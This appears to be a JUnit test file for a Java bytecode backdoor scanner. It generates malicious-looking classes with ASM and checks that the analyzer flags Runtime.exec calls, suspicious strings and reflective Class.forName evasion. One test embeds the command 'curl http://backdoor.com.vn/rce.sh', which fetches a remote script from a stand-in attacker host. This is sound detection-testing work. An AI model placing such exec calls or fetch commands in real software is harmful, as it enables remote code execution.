package backdoordetected.analyzers;

import static org.junit.jupiter.api.Assertions.*;

import backdoordetected.models.BytecodeAnalysisResult;
import backdoordetected.utils.ScanMode;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Path;
import java.util.Collections;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.Type;

class BytecodeAnalyzerTest implements Opcodes {

  private BytecodeAnalyzer analyzer;
  private Path tempClassFile;

  @TempDir
  File tempDir;

  @BeforeEach
  void setUp() throws IOException {
    analyzer = new BytecodeAnalyzer();
    tempClassFile = new File(tempDir, "MaliciousClass.class").toPath();
  }

  private void createMaliciousClass(String command) throws IOException {
    ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES | ClassWriter.COMPUTE_MAXS);
    cw.visit(V1_8, ACC_PUBLIC, "MaliciousClass", null, "java/lang/Object", null);
    MethodVisitor mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
    mv.visitCode();
    mv.visitVarInsn(ALOAD, 0);
    mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
    mv.visitMaxs(1, 1);
    mv.visitEnd();
    mv = cw.visitMethod(ACC_PUBLIC, "doEvil", "()V", null, null);
    mv.visitCode();
    mv.visitMethodInsn(
        INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
    mv.visitLdcInsn(command);
    mv.visitMethodInsn(
        INVOKEVIRTUAL,
        "java/lang/Runtime",
        "exec",
        "(Ljava/lang/String;)Ljava/lang/Process;",
        false);
    mv.visitInsn(RETURN);
    mv.visitMaxs(2, 1);
    mv.visitEnd();

    cw.visitEnd();

    try (FileOutputStream fos = new FileOutputStream(tempClassFile.toFile())) {
      fos.write(cw.toByteArray());
    }
  }

  @Test
  void testDetectsRuntimeExec() throws Exception {
    createMaliciousClass("calc.exe");
    BytecodeAnalysisResult result = (BytecodeAnalysisResult) analyzer.analyze(
        null,
        Collections.emptyList(),
        Collections.singletonList(tempClassFile),
        tempDir.toPath(),
        ScanMode.BYTECODE,
        "test-worker");

    assertFalse(result.getRawFindings().isEmpty(), "Should have findings");
    assertTrue(
        result.getRawFindings().stream()
            .anyMatch(s -> s.contains("Suspicious bytecode call to 'java/lang/Runtime.exec'")));
  }

  @Test
  void testDetectsSuspiciousString() throws Exception {
    createMaliciousClass("curl http://backdoor.com.vn/rce.sh");
    BytecodeAnalysisResult result = (BytecodeAnalysisResult) analyzer.analyze(
        null,
        Collections.emptyList(),
        Collections.singletonList(tempClassFile),
        tempDir.toPath(),
        ScanMode.BYTECODE,
        "test-worker");

    assertFalse(result.getRawFindings().isEmpty(), "Should have findings");
    assertTrue(
        result.getRawFindings().stream()
            .anyMatch(
                s -> s.contains("Suspicious string") && s.contains("Contains 'curl' command")));
  }

  private void createReflectiveClassForName(String part1, String part2) throws IOException {
    ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES | ClassWriter.COMPUTE_MAXS);
    cw.visit(V1_8, ACC_PUBLIC, "ReflectiveClassForName", null, "java/lang/Object", null);

    MethodVisitor mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
    mv.visitCode();
    mv.visitVarInsn(ALOAD, 0);
    mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
    mv.visitMaxs(1, 1);
    mv.visitEnd();
    mv = cw.visitMethod(ACC_PUBLIC, "callForName", "()V", null, null);
    mv.visitCode();
    mv.visitLdcInsn(part1);
    mv.visitLdcInsn(part2);
    mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "concat", "(Ljava/lang/String;)Ljava/lang/String;", false);
    mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
    mv.visitInsn(POP);
    mv.visitInsn(RETURN);
    mv.visitMaxs(2, 1);
    mv.visitEnd();
    cw.visitEnd();

    try (FileOutputStream fos = new FileOutputStream(tempClassFile.toFile())) {
      fos.write(cw.toByteArray());
    }
  }

  @Test
  void testDetectsSimpleConstantPropagationForName() throws Exception {
    createReflectiveClassForName("java.lang.Ru", "ntime");
    BytecodeAnalysisResult result = (BytecodeAnalysisResult) analyzer.analyze(
        null,
        Collections.emptyList(),
        Collections.singletonList(tempClassFile),
        tempDir.toPath(),
        ScanMode.BYTECODE,
        "test-worker");

    System.out.println("Raw Findings: " + result.getRawFindings());
    assertFalse(result.getRawFindings().isEmpty(), "Should have findings for Class.forName");
    assertTrue(
        result.getRawFindings().stream()
            .anyMatch(s -> s.contains(
                "CRITICAL REFLECTION: Class.forName(\"java.lang.Runtime\") resolved from constant string at line -1")),
        "Should detect constant propagation for Class.forName");
  }
}